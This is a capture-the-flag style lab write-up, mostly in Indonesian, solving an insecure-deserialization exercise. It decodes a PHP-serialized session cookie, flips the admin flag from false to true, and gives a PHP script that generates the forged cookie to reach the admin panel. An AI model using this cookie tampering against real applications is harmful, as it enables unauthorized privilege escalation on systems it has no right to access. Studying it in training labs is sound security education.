# Lab: Modifying serialized objects

Challenge Description
 This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

goal
 modify serialized objects berupa session user, privilege escalation menjadi admin dan hapus user carlos di admin panel

Solver
login dengan credential wiener:peter
disini ada 2 cara untuk memanfaatkan rentan ini untuk mendapatkan privilege escalation
yang pertama dengan burpsuite
decode session kita dengan base64
`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=` ini akan menghasilkan
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
untuk mendapatkan akses yang tidak sah alias menjadi admin
cukup dengan 
mengganti ini
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
menjadi
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`
kemungkinan dibalik kodenya sama saja seperti ini
`$admin = false;` => `$admin = true;`

cara yang kedua bisa dengan menggunakan script php, alias mereka ulang
```php
<?php
class User {
    public $username = "wiener";
    public $admin = true;
}

$payload = base64_encode(serialize(new User()));
echo $payload;
// Output: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
?>
```
sisanya dengan privilege escalation yang diperoleh masuk ke panel admin dan hapus user carlos
